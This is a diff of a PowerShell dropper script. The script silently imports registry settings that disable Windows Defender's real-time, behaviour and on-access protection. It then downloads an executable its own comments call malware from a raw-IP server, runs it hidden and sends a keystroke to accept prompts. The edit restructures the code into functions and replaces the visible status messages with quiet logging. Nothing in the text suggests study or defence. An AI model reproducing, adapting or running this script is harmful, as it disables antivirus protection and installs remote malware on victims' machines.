@@ -1,5 +1,6 @@
 # Function to disable Windows Defender
-$disableDefenderScript = @"
+function Disable-WindowsDefender {
+    $regContent = @"
 Windows Registry Editor Version 5.00
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
@@ -10,32 +11,57 @@ Windows Registry Editor Version 5.00
 "DisableBehaviorMonitoring"=dword:00000001
 "DisableOnAccessProtection"=dword:00000001
 "DisableScanOnRealtimeEnable"=dword:00000001
-"@"
+"@
 
-Set-Content -Path "$($env:TEMP)\disable_defender.reg" -Value $disableDefenderScript
-
-# Import the registry settings to disable Windows Defender
-try {
-    regedit.exe /s "$($env:TEMP)\disable_defender.reg"
-    Write-Output "Windows Defender disabled successfully."
-} catch {
-    Write-Output "Failed to disable Windows Defender."
+    $regFilePath = "$env:TEMP\disable_defender.reg"
+    $regContent | Out-File -FilePath $regFilePath -Encoding ASCII
+    try {
+        Start-Process regedit.exe -ArgumentList "/s $regFilePath" -Wait -ErrorAction Stop
+    } catch {
+        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender: $_" -ErrorAction SilentlyContinue
+    }
 }
 
 # Function to download a file silently
-$installerUrl = 'http://54.224.34.222:3004/uploads/BootyMistress.exe'
-$installerPath = "$($env:TEMP)\installer.exe"
-try {
-    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
-    Write-Output "Downloaded malware file to $installerPath."
-} catch {
-    Write-Output "Failed to download malware file."
+function Download-File {
+    param (
+        [string]$url,
+        [string]$outputPath
+    )
+
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
+    } catch {
+        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to download: $url" -ErrorAction SilentlyContinue
+    }
 }
 
 # Function to run an executable silently
-try {
-    Start-Process -FilePath $installerPath -NoNewWindow -PassThru
-    Write-Output "Executed malware successfully."
-} catch {
-    Write-Output "Failed to execute malware. Exit code: $($_.Exception.Message)"
+function Run-Executable {
+    param (
+        [string]$filePath
+    )
+
+    try {
+        $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru -WindowStyle Hidden
+        $process.WaitForInputIdle()
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("Y")
+        $process.WaitForExit()
+    } catch {
+        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to execute: $filePath" -ErrorAction SilentlyContinue
+    }
 }
+
+# URL of the malware file
+$malwareUrl = "http://54.224.34.222:3004/uploads/BootyMistress.exe"
+
+# Path to download the file
+$downloadPath = "$env:TEMP\installer.exe"
+
+# Ensure Windows Defender is disabled before downloading and executing the malware
+Disable-WindowsDefender
+
+# Download and run the malware file
+Download-File -url $malwareUrl -outputPath $downloadPath
+Run-Executable -filePath $downloadPath
